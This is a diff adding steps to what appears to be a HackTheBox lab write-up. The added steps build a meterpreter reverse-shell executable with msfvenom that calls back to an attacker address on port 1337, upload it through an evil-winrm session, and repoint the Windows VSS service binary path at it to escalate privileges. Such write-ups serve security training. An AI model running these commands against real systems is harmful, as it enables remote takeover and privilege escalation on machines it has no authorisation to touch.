@@ -181,7 +181,33 @@ Why VSS?
 
 17. Now let's make a reverse shell exe using **msfvenom**.
 
-> 
+> COMMAND
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.27 LPORT=1337 -f exe -o exp.exe
+```
+
+#### NOTE: Create the exe in the same directory as the executed evil-winrm.
+
+18. To upload it to the winrm shell, simply run --> upload exp.exe.
+
+> RESULT
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c125aef8-7281-48b7-945e-cc541736a2dd)
+
+
+19. Now we need to change the binary path for VSS.
+
+> COMMAND
+
+```
+sc.exe config VSS binPath="C:\Users\svc-printer\Downloads\exp.exe -e cmd.exe 10.10.14.27 1337"
+```
+
+
+
+
+
 
 ## IMPORTANT LINKS
 
